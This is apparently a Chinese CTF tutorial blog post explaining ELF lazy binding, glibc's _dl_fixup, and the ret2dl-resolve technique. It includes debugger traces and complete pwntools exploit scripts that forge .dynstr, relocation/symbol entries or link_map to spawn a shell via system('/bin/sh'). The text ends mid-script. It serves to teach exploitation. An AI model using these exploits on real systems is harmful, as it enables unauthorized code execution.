    <content type="text"><![CDATA[参考链接:https://www.freebuf.com/articles/system/170661.htmlhttps://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#morehttps://bbs.pediy.com/thread-227034.htmhttps://bbs.pediy.com/thread-253833.htmhttps://blog.csdn.net/conansonic/article/details/54634142 前置知识：函数执行流程因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。1234567891011//gcc fun.c -fno-stack-protector -m32 -o fun#include &lt;unistd.h&gt;#include &lt;string.h&gt;void fun()&#123; char buffer[0x20]; read(0,buffer,0x200);&#125;int main()&#123; fun(); return 0;&#125; 以read函数为例，下断点到read@plt 123pwndbg&gt; b *0x80482e0Breakpoint 3 at 0x80482e0pwndbg&gt; c 1234567891011121314151617181920► 0x80482e0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt; // 0x804a00c是read的got.plt表地址，里面存放着0x80482e6 0x80482e6 &lt;read@plt+6&gt; push 0 // _dl_runtime_resolve第二个参数 0x80482eb &lt;read@plt+11&gt; jmp 0x80482d0 ↓ 0x80482d0 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; // _dl_runtime_resolve第一个参数 0x80482d6 jmp dword ptr [0x804a008] &lt;0xf7fee000&gt; ↓ 0xf7fee000 &lt;_dl_runtime_resolve&gt; push eax 0xf7fee001 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fee002 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fee003 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fee007 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fee00b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe77e0&gt; //执行完_dl_fixup后eax存放着glibc中read函数的地址 0xf7fee010 &lt;_dl_runtime_resolve+16&gt; pop edx 0xf7fee011 &lt;_dl_runtime_resolve+17&gt; mov ecx, dword ptr [esp] 0xf7fee014 &lt;_dl_runtime_resolve+20&gt; mov dword ptr [esp], eax //把read函数地址存到esp 0xf7fee017 &lt;_dl_runtime_resolve+23&gt; mov eax, dword ptr [esp + 4] 0xf7fee01b &lt;_dl_runtime_resolve+27&gt; ret 0xc //返回到 read函数 0xf7fee01e nop 12pwndbg&gt; x/4xw 0x804a00c0x804a00c: 0x080482e6 0xf7df4540 0x00000000 0x00000000 12pwndbg&gt; x/4xw 0x804a0040x804a004: 0xf7ffd918 0xf7fee000 0x080482e6 0xf7df4540 通过上面一步一步调试，可以清楚看到函数执行流程，call read@plt –&gt;read@got.plt –&gt;read@plt+6 –&gt;_dl_runtime_resolve(link_map,rel_offest) –&gt; _dl_fixup –&gt; ret _dl_runtime_resolve+16 –&gt; ret read其中_dl_runtime_resolve函数的两个参数 link_map=0xf7ffd918,rel_offest=0，执行完_dl_runtime_resolve()函数后，就返回到了read函数。 但绑定的过程是在 _dl_fixup中实现的，接下通过_dl_fixup的源码分析一下函数绑定的实现1234567pwndbg&gt; stack 600:0000│ esp 0xffffcf04 —▸ 0xf7ffd918 ◂— 0x001:0004│ 0xffffcf08 ◂— 0x002:0008│ 0xffffcf0c —▸ 0x8048424 (fun+25) ◂— add esp, 0x1003:000c│ 0xffffcf10 ◂— 0x004:0010│ 0xffffcf14 —▸ 0xffffcf20 ◂— 0x800005:0014│ 0xffffcf18 ◂— 0x200 1230xf7fee00b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe77e0&gt; arg[0]: 0xffffcf94 ◂— 0x0 arg[1]: 0xffffcf70 ◂— 0x1 借用Veritas501大佬的图更直观的了解这个过程 ELF关于动态链接的一些关键section先熟悉一下几个动态链接的一些关键section，以便于分析源码 .dynamic包含了一些关于动态链接的关键信息，在这个fun上它长这样，事实上这个section所有程序都差不多 1234567891011121314151617181920212223242526LOAD:08049F14 _DYNAMIC Elf32_Dyn &lt;1, &lt;1&gt;&gt; ; DATA XREF: LOAD:080480BC↑oLOAD:08049F14 ; .got.plt:_GLOBAL_OFFSET_TABLE_↓oLOAD:08049F14 ; DT_NEEDED libc.so.6LOAD:08049F1C Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INITLOAD:08049F24 Elf32_Dyn &lt;0Dh, &lt;80484B4h&gt;&gt; ; DT_FINILOAD:08049F2C Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAYLOAD:08049F34 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt; ; DT_INIT_ARRAYSZLOAD:08049F3C Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAYLOAD:08049F44 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt; ; DT_FINI_ARRAYSZLOAD:08049F4C Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASHLOAD:08049F54 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTABLOAD:08049F5C Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTABLOAD:08049F64 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt; ; DT_STRSZLOAD:08049F6C Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt; ; DT_SYMENTLOAD:08049F74 Elf32_Dyn &lt;15h, &lt;0&gt;&gt; ; DT_DEBUGLOAD:08049F7C Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOTLOAD:08049F84 Elf32_Dyn &lt;2, &lt;10h&gt;&gt; ; DT_PLTRELSZLOAD:08049F8C Elf32_Dyn &lt;14h, &lt;11h&gt;&gt; ; DT_PLTRELLOAD:08049F94 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPRELLOAD:08049F9C Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_RELLOAD:08049FA4 Elf32_Dyn &lt;12h, &lt;8&gt;&gt; ; DT_RELSZLOAD:08049FAC Elf32_Dyn &lt;13h, &lt;8&gt;&gt; ; DT_RELENTLOAD:08049FB4 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEEDLOAD:08049FBC Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUMLOAD:08049FC4 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYMLOAD:08049FCC Elf32_Dyn &lt;0&gt; ; DT_NULL 这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S fun看一下各个段的地址，会发现这三个section的地址跟在ida所示的地址是一样的。 12345678910111213141516171819202122232425262728293031323334353637383940readelf -S fun共有 31 个节头，从偏移量 0x17f0 开始：节头： [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 000020 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481cc 0001cc 000050 10 A 6 1 4 [ 6] .dynstr STRTAB 0804821c 00021c 00004a 00 A 0 0 1 [ 7] .gnu.version VERSYM 08048266 000266 00000a 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 08048270 000270 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048290 000290 000008 08 A 5 0 4 [10] .rel.plt REL 08048298 000298 000010 08 AI 5 24 4 [11] .init PROGBITS 080482a8 0002a8 000023 00 AX 0 0 4 [12] .plt PROGBITS 080482d0 0002d0 000030 04 AX 0 0 16 [13] .plt.got PROGBITS 08048300 000300 000008 00 AX 0 0 8 [14] .text PROGBITS 08048310 000310 0001a2 00 AX 0 0 16 [15] .fini PROGBITS 080484b4 0004b4 000014 00 AX 0 0 4 [16] .rodata PROGBITS 080484c8 0004c8 000008 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 080484d0 0004d0 000034 00 A 0 0 4 [18] .eh_frame PROGBITS 08048504 000504 0000ec 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 //dynamic [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000014 04 WA 0 0 4 [25] .data PROGBITS 0804a014 001014 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a01c 00101c 000004 00 WA 0 0 1 [27] .comment PROGBITS 00000000 00101c 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 0016e3 00010a 00 0 0 1 [29] .symtab SYMTAB 00000000 001054 000460 10 30 47 4 [30] .strtab STRTAB 00000000 0014b4 00022f 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) .dynsym12345678LOAD:080481CC ; ELF Symbol TableLOAD:080481CC Elf32_Sym &lt;0&gt;LOAD:080481DC Elf32_Sym &lt;offset aRead - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; "read"LOAD:080481EC Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; "__gmon_start__"LOAD:080481FC Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, \ ; "__libc_start_main"LOAD:080481FC 0&gt;LOAD:0804820C Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, \ ; "_IO_stdin_used"LOAD:0804820C offset _IO_stdin_used, 4, 11h, 0, 10h&gt; 这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下123456789typedef struct&#123; Elf32_Word st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0 .dynstr一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x080481AC的偏移。12345678910111213LOAD:0804821C ; ELF String TableLOAD:0804821C byte_804821C db 0 ; DATA XREF: LOAD:080481DC↑oLOAD:0804821C ; LOAD:080481EC↑o ...LOAD:0804821D aLibcSo6 db 'libc.so.6',0LOAD:08048227 aIoStdinUsed db '_IO_stdin_used',0 ; DATA XREF: LOAD:0804820C↑oLOAD:08048236 aRead db 'read',0 ; DATA XREF: LOAD:080481DC↑oLOAD:0804823B aLibcStartMain db '__libc_start_main',0LOAD:0804823B ; DATA XREF: LOAD:080481FC↑oLOAD:0804824D aGmonStart db '__gmon_start__',0 ; DATA XREF: LOAD:080481EC↑oLOAD:0804825C aGlibc20 db 'GLIBC_2.0',0LOAD:08048266 align 4LOAD:08048268 dd 2, 10002h, 10001h, 1, 10h, 0LOAD:08048280 dd 0D696910h, 20000h, 40h, 0 .rel.plt12345LOAD:08048290 ; ELF REL Relocation TableLOAD:08048290 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__LOAD:08048298 ; ELF JMPREL Relocation TableLOAD:08048298 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT readLOAD:080482A0 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main 这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：12345678typedef struct&#123; Elf32_Addr r_offset; //指向GOT表的指针 Elf32_Word r_info; //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07 //1和3是这个导入函数的符号在.dynsym中的下标， //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应&#125; Elf32_Rel; gilbc2.23 _dl_fixup源码分析glibc源码阅读网站 https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61glibc源码下载网站 http://ftp.gnu.org/gnu/glibc/ _dl_fixup函数的两个参数 struct link_map *l , ELFW(Word) reloc _arg都在glibc/elf/link.h中定义12345678910struct link_map &#123; /* 前几个成员是使用调试器的协议的一部分. 这与SVR4中使用的格式相同. */ ElfW(Addr) l_addr; /* ELF文件中的地址与内存中的地址之间的差异*/ char *l_name; /* 绝对文件名对象. */ ElfW(Dyn) *l_ld; /* 共享对象的动态部分 .dynamic */ struct link_map *l_next, *l_prev; /* 后一个链和前一个链.*/ &#125;; 12345/* We use this macro to refer to ELF types independent of the native wordsize. `ElfW(TYPE)' is used in place of `Elf32_TYPE' or `Elf64_TYPE'. */#define ElfW(type) _ElfW (Elf, __ELF_NATIVE_CLASS, type)#define _ElfW(e,w,t) _ElfW_1 (e, w, _##t)#define _ElfW_1(e,w,t) e##w##t _dl_fixup 在glibc/elf/dl-runtime.c首先说第一个参数，是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section 而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，read就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586_dl_fixup ( # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS, # endif struct link_map *l, ElfW(Word) reloc_arg) &#123; //获取symtab（存放dynsym的数组） const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); //获取strtab(存放符号名的数组) const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); //获取reloc_arg对应的rel.plt项 const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); //获取reloc_arg对应的dynsym const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; const ElfW(Sym) *refsym = sym; //指向对应的got表，以便将解析结果写回去 void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we're really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; const struct r_found_version *version = NULL; if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123; const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff; version = &amp;l-&gt;l_versions[ndx]; if (version-&gt;hash == 0) version = NULL; &#125; /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) &#123; THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; &#125; #ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL; #endif //根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG (); #ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL; #endif //得到结果 value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); &#125; else &#123; /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value); result = l; &#125; /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value; //将结果写回到got表中 return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); &#125; _dl_fixup函数 1 _dl_fixup函数首先通过宏D_PTR从用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针 2 rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel 3 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym 4 .dynstr + sym-&gt;st_name得出符号名字符串指针 5 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表 6 调用这个函数 利用那么，这个怎么去利用呢，有多种利用方式 伪造 .dynsym即使保护全没开 .dynsym也是不可写的，但可以通过改写.dynamic的DT_STRTAB来伪造ELF String Table，也就是.dynsym这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(“bin/sh”)（因为只有第一次才会resolve），就等于调用了system(“/bin/sh”)。 例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647unsigned __int64 edit()&#123; unsigned __int8 a1; // [rsp+Eh] [rbp-12h] unsigned __int8 size; // [rsp+Fh] [rbp-11h] note *v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); a1 = 0; read_buf((char *)&amp;a1, 1u); if ( !notes[a1] ) exit(-1); v3 = notes[a1]; size = 0; read_buf((char *)&amp;size, 1u); read_buf(v3-&gt;buf, size); // heap overflow堆溢出 return __readfsqword(0x28u) ^ v4;&#125; unsigned __int64 add()&#123; unsigned __int8 size; // [rsp+Bh] [rbp-15h] int i; // [rsp+Ch] [rbp-14h] note *v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); if ( number &gt; 32 ) exit(-1); size = 0; v3 = (note *)calloc(0x10uLL, 1uLL); if ( !v3 ) exit(-1); read_buf((char *)&amp;size, 1u); if ( !size ) exit(-1); v3-&gt;buf = (char *)calloc(size, 1uLL); //堆中存放了指针，所以可以通过这个任意写 if ( !v3-&gt;buf ) exit(-1); read_buf(v3-&gt;buf, size); v3-&gt;size = size; for ( i = 0; i &lt;= 31 &amp;&amp; notes[i]; ++i ) ; notes[i] = v3; ++number; return __readfsqword(0x28u) ^ v4;&#125; 所以呢，可以先add两个note，然后编辑第一个note使得堆溢出到第二个note的指针，然后再修改第二个note，实现任意写。至于写什么，刚刚也说了，先写.dynamic指向字符串表的指针，使其指向一块可写内存，比如.bss，然后再写这块内存，使得相应偏移出刚好有个system\x00。exp如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import * g_local=True#e=ELF('./libc.so.6')#context.log_level='debug'if g_local: sh =process('./RNote4')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125; gdb.attach(sh)else: sh = remote("rnote4.2018.teamrois.cn", 6767) def add(content): assert len(content) &lt; 256 sh.send("\x01") sh.send(chr(len(content))) sh.send(content) def edit(idx, content): assert idx &lt; 32 and len(content) &lt; 256 sh.send("\x02") sh.send(chr(idx)) sh.send(chr(len(content))) sh.send(content) def delete(idx): assert idx &lt; 32 sh.send("\x03") sh.send(chr(idx)) #伪造的字符串表，(0x457-0x3f8)刚好是"free\x00"字符串的偏移payload = "C" * (0x457-0x3f8) + "system\x00"#先新建两个notesadd("/bin/sh\x00" + "A" * 0x10)add("/bin/sh\x00" + "B" * 0x10)#溢出时尽量保证堆块不被破坏，不过这里不会再做堆的操作了其实也无所谓edit(0, "/bin/sh\x00" + "A" * 0x10 + p64(33) + p64(0x18) + p64(0x601EB0))#将0x601EB0，即.dynamic的字符串表指针，写成0x6020C8edit(1, p64(0x6020C8)) edit(0, "/bin/sh\x00" + "A" * 0x10 + p64(33) + p64(0x18) + p64(0x6020C8))#在0x6020C8处写入伪造的字符串表edit(1, payload) #会第一次调用free，所以实际上是system("/bin/sh")被调用，如前面所说delete(0)sh.interactive() 伪造Elf32_Rel通过操纵第二个参数，使其指向我们所构造的Elf32_Rel 当.dynamic不可写时，那么以上方法就没用了，所以有第二种利用方法 上面我们讲完了函数的解析流程 主要是由dl_runtime_resolve(link_map,rel_offset),之所以它能解析不同函数的地址，以为我们传入的rel_offset不同，因此，把传入的rel_offset改为我们希望的函数的偏移，便可以执行我们希望的函数，新的问题来了，.rel.plt中不一定存在我们希望的函数，因此就需要我们伪造一个.rel.plt，将rel_offset修改为一个比较大的值，在.rel.plt+rel_offset的地方是我们伪造好的，结构跟.rel.plt相同的数据，这样我们就相当于伪造好了reloc（重定位入口），程序又会根据r_info找到对应的.dynsym中的symbols，我们再次伪造symbols的内容-&gt;st_name,使得到的str在我们的可控地址内，然后在.dynstr+st_name地址处放置库函数字符串例如：system。 所以，最终的利用思路，大概是1234.plt:0000000000400610 ; __unwind &#123;.plt:0000000000400610 push cs:qword_602008.plt:0000000000400616 jmp cs:qword_602010.plt:0000000000400616 sub_400610 endp 构造ROP，跳转到resolve的PLT，push link_map的位置，就是上面所示的这个地方，也就是要调用_dl_runtime_resolve的地方,此时，栈中必须要有已经伪造好的指向伪造的Elf32_Rel的偏移 伪造一个很大的rel_offset，一直偏移到bss段（一般这里可读可写，且位于.rel.plt的高地址） 伪造Elf32_Rel即.rel.plt的结构,由RELSZ可知，它的大小为8字节（commend: readelf -d fun 可以看到），我们需要fake r_offset,以及r_info，r_offset一般是函数在.got.plt的地址，r_info可以用来计算在symtab中的index并且保存了类型，所以我们可以让伪造的symtab的数据紧跟在这段数据后面，这样我们就可以计算出它的index: index=(bss+0×100-.dynsym)/0×10(因为SYMENT指明大小为16字节)，类型必须为7，所以我们就可以计算出r_info的值r_info=(index &lt;&lt; 8 ) | 0x7 伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处 伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如systemdl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数 利用思路如下: 第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链 1234payload1 = 'a'*0x2C payload1 += p32(pop_ebp_ret) + p32(bss + 0x800) payload1 += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_stage) + p32(0x1000)sh.send(payload1) 第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构完整的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/env python# coding=utf-8from pwn import *p=process('./fun')pop_ebp_ret=0x080484ableave_ret=0x08048378fake_stack_size=0x800bss=0x0804a01cread_plt=0x080482e0read_got=0x0804a00cbss_stage=bss+fake_stack_sizedynsym=0x080481ccdynstr=0x0804821cdl_runtime_resolve=0x080482d0relplt=0x08048298rel_offset=bss_stage+28-relpltfake_sym_addr=bss_stage+36align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #为了16字节对齐print 'align==&gt;'+hex(align)fake_sym_addr=fake_sym_addr+alignindex=(fake_sym_addr-dynsym)/0x10print 'index==&gt;'+hex(index)r_info=(index&lt;&lt;8)|0x7print 'r_info==&gt;'+hex(r_info)fake_raloc=p32(read_got)+p32(r_info)st_name=fake_sym_addr-dynstr+16fake_sym=p32(st_name)+p32(0)+p32(0)+p8(0x12)+p8(0)+p16(0)#gdb.attach(p)payload1 = 'a'*0x2C payload1 += p32(pop_ebp_ret) + p32(bss + 0x800) payload1 += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_stage) + p32(0x1000)p.send(payload1)binsh='/bin/sh'payload='aaaa'payload+=p32(dl_runtime_resolve)payload+=p32(rel_offset)payload+='aaaa'payload+=p32(bss_stage+80)payload+='aaaa'payload+='aaaa'payload+=fake_ralocpayload+='a'*alignpayload+=fake_sympayload+='system\0'payload+='a'*(80-len(payload))payload+=binsh+'\x00'payload+='a'*(100-len(payload))p.send(payload)p.interactive() 伪造link_map64位情况下，伪造rel.plt变得不可行，因为在 12345678if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123; const ElfW(Half) *vernum =(const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff; version = &amp;l-&gt;l_versions[ndx]; if (version-&gt;hash == 0) version = NULL; &#125; 这里，出现了访问未映射的内存主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000然后真正的rel.plt位于0x400000内，导致过大。如果我们在里0x400000处有可读写的区域，或许就可以成功 因此，我们得另外想办法，那么得回过来看源代码12345678if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; ... &#125; else &#123; /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value); result = l; &#125; 我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的地址,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址 如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得 为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可, 以jiavis oj level3_x64为例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *context.log_level = 'debug'elf = ELF('./level3_x64')libc = elf.libcp = process('./level3_x64')# gdb.attach(p,'b*0x400618')'''typedef struct &#123; Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ &#125;Elf64_Sym; typedef struct &#123; Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ Elf64_Sxword r_addend; /* Addend */ &#125;Elf64_Rela; typedef struct &#123; Elf64_Sxword d_tag; /* Dynamic entry type */ union &#123; Elf64_Xword d_val; /* Integer value */ Elf64_Addr d_ptr; /* Address value */ &#125; d_un;&#125;Elf64_Dyn;''' universal_gadget1 = 0x4006AAuniversal_gadget2 = 0x400690 Elf64_Sym_len = 0x18Elf64_Rela_len = 0x18write_addr = 0x600ad0link_map_addr = write_addr+0x18rbp = write_addr-8pop_rdi_ret = 0x4006b3leave = 0x400618main = 0x4005E6 #fake_Elf64_Dyn_STR_addr = l+0x68 #fake_Elf64_Dyn_SYM_addr = l+0x70 #fake_Elf64_Dyn_JMPREL_addr = l+0xf8 l_addr = libc.sym['system'] - libc.sym['__libc_start_main']#l-&gt;l_addr + sym-&gt;st_value# value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value); def fake_link_map_gen(link_map_addr,l_addr,st_value): fake_Elf64_Dyn_JMPREL_addr = link_map_addr + 0x18 fake_Elf64_Dyn_SYM_addr = link_map_addr + 8 fake_Elf64_Dyn_STR_addr = link_map_addr fake_Elf64_Dyn_JMPREL = p64(0) + p64(link_map_addr+0x28) fake_Elf64_Dyn_SYM = p64(0) + p64(st_value-8) fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(7) + p64(0) fake_link_map = p64(l_addr) #0x8 